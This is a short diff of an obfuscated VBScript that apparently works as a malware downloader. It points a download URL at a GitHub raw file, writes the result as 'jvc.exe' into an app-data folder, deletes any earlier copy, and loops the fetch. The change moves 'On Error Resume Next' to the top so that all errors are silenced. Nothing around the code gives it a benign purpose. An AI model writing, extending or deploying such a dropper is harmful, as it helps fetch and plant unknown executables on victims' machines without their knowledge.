@@ -1,3 +1,4 @@
+On Error Resume Next
 UMbty = GetAppDateFolder("jvc")
 UMbty = UMbty & "jvc.exe"
 Dim FDrtw
@@ -11,7 +12,7 @@ FDrtw = "https://raw.githubusercontent.com/jommb/872/master/m"
 end if
 Set FDrtt = CreateObject("Scripting.FileSystemObject")
 If FDrtt.FileExists(UMbty) Then FDrtt.DeleteFile UMbty
-On Error Resume Next
+If FDrtt.FileExists(UMbty) Then FDrtt.DeleteFile UMbty
 Do
  Err.Clear
  FDrty FDrtw, UMbty
